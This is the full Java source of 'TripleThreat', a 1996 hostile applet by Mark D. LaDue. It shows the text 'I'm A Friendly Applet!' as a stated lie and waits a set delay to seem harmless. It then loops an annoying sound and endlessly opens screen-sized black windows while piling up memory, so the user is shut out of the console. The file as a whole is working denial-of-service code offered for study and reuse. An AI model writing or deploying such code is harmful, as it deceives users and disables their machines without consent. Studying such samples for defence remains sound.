package hostile;
/* TripleThreat.java by Mark D. LaDue */

/* February 17, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/* This Java Applet is intended to spew forth huge non-functioning
   black windows and obliterate the screen in order to exclude the
   user from the console.  It also features a terribly annoying sound
   that won't stop until you do something drastic. */

import java.awt.*;
import java.applet.AudioClip;

public class TripleThreat extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font wordFont = new Font("TimesRoman", Font.BOLD, 36);

//  This thread will attempt to spew forth huge windows and waste resources 
    Thread wasteResources = null;

//  An offscreen Image where lots of action will take place
//    Image offscreenImage;

//  Graphics tools to handle the offscreen Image
//    Graphics offscreenGraphics;

//  To avoid arrays and have open-ended storage of results
    StringBuffer holdBigNumbers = new StringBuffer(0);

//  An annoying sound coming through the open window
    AudioClip annoy;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds
    int delay;

//  A window that repeatedly tries to obscure everything 
    Frame littleWindow;


/*  Set up a big white rectangle in the browser, get the sound, and
    create the offscreen graphics  */ 

    public void init() {
    setBackground(Color.white);
//    offscreenImage = createImage(this.size().width, this.size().height);
//    offscreenGraphics = offscreenImage.getGraphics();

    //annoy = getAudioClip(getCodeBase(), "Sounds/whistle.au");
    annoy = getAudioClip(getCodeBase(), "images/monkey.au");

//  Determine how many seconds the thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
    }


/*  Create and start the offending thread in the standard way */

    public void start() {
        if (wasteResources == null) {
        wasteResources = new Thread(this);
        //wasteResources.setPriority(Thread.MAX_PRIORITY);
        wasteResources.start();
        }
    }

/*  We certainly won't be stopping anything */

    public void stop() {}


/* Start the annoying sound and repeatedly open windows
   while doing lots of other wasteful operations */ 

    public void run() {

//  Let the applet tell its lie
    repaint();

//  Let the applet appear honest by having its thread sleep for a while
        try {Thread.sleep(delay);}
        catch (InterruptedException e) {}

//  Start the senseless noise
    annoy.loop();

//  Now fill the screen with huge windows, one atop another, and do
//  a lots of wasteful stuff!

        while (true) {
        try {
        holdBigNumbers.append(0x7fffffffffffffffL);
        littleWindow = new TripleFrame("ACK!"); // create a window
        littleWindow.resize(1000000, 1000000);  // make it big!
        littleWindow.move(-1000, -1000);  // cover everything
        littleWindow.show();  //  now open the big window 
        }
        catch (OutOfMemoryError o) {}
        repaint();
        }
    }


/*  Paints the applet's lie */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.setFont(wordFont);
    g.drawString("I'm A Friendly Applet!", 10, 200);
//    offscreenGraphics.setColor(Color.white);
//    offscreenGraphics.drawRect(0, 0, this.size().width, this.size().height);
//    offscreenGraphics.setColor(Color.blue);
//    offscreenGraphics.drawString(holdBigNumbers.toString(), 10, 50);
    }
}

/* Makes the big, opaque windows */

class TripleFrame extends Frame {
    Label l;

//  Constructor method
    TripleFrame(String title) {
        super(title);
        setLayout(new GridLayout(1, 1));
        Canvas blackCanvas = new Canvas();
        blackCanvas.setBackground(Color.black);
        add(blackCanvas);
    }
}

